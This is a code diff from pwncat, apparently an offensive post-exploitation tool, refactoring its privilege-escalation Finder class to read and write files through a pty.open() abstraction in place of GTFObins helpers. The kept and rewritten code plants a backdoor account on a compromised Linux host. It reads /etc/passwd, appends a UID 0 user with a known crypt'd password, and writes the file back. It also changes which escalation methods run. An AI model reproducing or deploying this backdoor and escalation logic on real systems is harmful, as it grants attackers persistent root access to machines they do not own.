@@ -3,21 +3,22 @@ from typing import Type, List, Tuple
 import crypt
 from time import sleep
 import socket
+from pprint import pprint
 
-from pwncat.privesc.base import Method, PrivescError, Technique, SuMethod, Capability
+from pwncat.privesc.base import Method, PrivescError, Technique, SuMethod
 from pwncat.privesc.setuid import SetuidMethod
 from pwncat.privesc.sudo import SudoMethod
 from pwncat.privesc.dirtycow import DirtycowMethod
 from pwncat.privesc.screen import ScreenMethod
 from pwncat import downloader
-from pwncat import gtfobins
+from pwncat.gtfobins import Capability
 from pwncat import util
 
 
 # privesc_methods = [SetuidMethod, SuMethod]
 # privesc_methods = [SuMethod, SudoMethod, SetuidMethod, DirtycowMethod, ScreenMethod]
 # privesc_methods = [SuMethod, SudoMethod, ScreenMethod, SetuidMethod]
-privesc_methods = [SuMethod, SetuidMethod]
+privesc_methods = [SuMethod, SudoMethod]
 
 
 class Finder:
@@ -87,37 +88,23 @@ class Finder:
         self.pty.reload_users()
 
         if self.backdoor_user_name not in self.pty.users:
-            binary = gtfobins.Binary.find_capability(self.pty.which, Capability.READ)
-            if binary is None:
-                raise PrivescError("no file read methods available from gtfobins")
 
-            # Read the etc/passwd file
-            passwd = self.pty.subprocess(binary.read_file("/etc/passwd"))
-            data = passwd.read()
-            passwd.close()
-
-            # Split up the file by lines
-            data = data.decode("utf-8").strip()
-            data = data.split("\n")
+            # Read /etc/passwd
+            with self.pty.open("/etc/passwd", "r") as filp:
+                data = filp.readlines()
 
             # Add a new user
             password = crypt.crypt(self.backdoor_password)
             user = self.backdoor_user_name
-            data.append(f"{user}:{password}:0:0::/root:{self.pty.shell}")
+            data.append(f"{user}:{password}:0:0::/root:{self.pty.shell}\n")
 
             # Prepare data for transmission
-            data = ("\n".join(data) + "\n").encode("utf-8")
+            data = "".join(data)
 
-            # Find a GTFObins payload that works
-            binary = gtfobins.Binary.find_capability(self.pty.which, Capability.WRITE)
-            if binary is None:
-                raise PrivescError("no file write methods available from gtfobins")
-
-            # Write the file
-            self.pty.run(binary.write_file("/etc/passwd", data))
-
-            # Stabilize output after the file write
-            self.pty.run("echo")
+            # Write the data. Giving open the length opens up some other writing
+            # options from GTFObins
+            with self.pty.open("/etc/passwd", "w", length=len(data)) as filp:
+                filp.write(data)
 
             # Reload the /etc/passwd data
             self.pty.reload_users()
@@ -151,13 +138,9 @@ class Finder:
             or current_user["uid"] == 0
             or current_user["name"] == "root"
         ):
-            binary = gtfobins.Binary.find_capability(
-                self.pty.which, Capability.WRITE, safe=safe
-            )
-            if binary is None:
-                raise PrivescError("no binaries to write with")
-
-            return self.pty.subprocess(binary.write_file(filename, data)), chain
+            with self.pty.open(filename, "wb", length=len(data)) as filp:
+                filp.write(data)
+            return chain
 
         if starting_user is None:
             starting_user = current_user
@@ -223,11 +206,8 @@ class Finder:
             or current_user["uid"] == 0
             or current_user["name"] == "root"
         ):
-            binary = gtfobins.Binary.find_capability(self.pty.which, Capability.READ)
-            if binary is None:
-                raise PrivescError("no binaries to read with")
-
-            return self.pty.subprocess(binary.read_file(filename)), chain
+            pipe = self.pty.open(filename, "rb")
+            return pipe, chain
 
         if starting_user is None:
             starting_user = current_user
@@ -281,7 +261,7 @@ class Finder:
 
         shlvl = self.pty.getenv("SHLVL")
 
-        if (technique.capabilities & Capability.SHELL) > 0:
+        if Capability.SHELL in technique.capabilities:
             try:
                 # Attempt our basic, known technique
                 exit_script = technique.method.execute(technique)
@@ -323,21 +303,9 @@ class Finder:
         if su_command is None:
             raise PrivescError("privesc failed")
 
-        # Read the current content of /etc/passwd
-        reader = gtfobins.Binary.find_capability(self.pty.which, Capability.READ)
-        if reader is None:
-            raise PrivescError("no file reader found")
-
-        payload = reader.read_file("/etc/passwd")
-
-        # Read the file
-        passwd = self.pty.subprocess(reader.read_file("/etc/passwd"))
-        data = passwd.read()
-        passwd.close()
-
-        # Split up the file by lines
-        data = data.decode("utf-8").strip()
-        data = data.split("\n")
+        # Read /etc/passwd
+        with self.pty.open("/etc/passwd", "r") as filp:
+            data = filp.readlines()
 
         # Add a new user
         password = crypt.crypt(self.backdoor_password)
@@ -408,9 +376,7 @@ class Finder:
         for method in self.methods:
             try:
                 util.progress(f"evaluating {method} method")
-                found_techniques = method.enumerate(
-                    capability=Capability.SHELL | Capability.SUDO | Capability.WRITE
-                )
+                found_techniques = method.enumerate(Capability.SHELL | Capability.WRITE)
                 for tech in found_techniques:
                     if tech.user == target_user:
                         try:
@@ -458,6 +424,8 @@ class Finder:
         # Work backwards to get back to the original shell
         for technique, exit in reversed(techniques):
             self.pty.run(exit, wait=False)
+
+        self.pty.flush_output()
 
         # Reset the terminal to get to a sane prompt
         self.pty.reset()
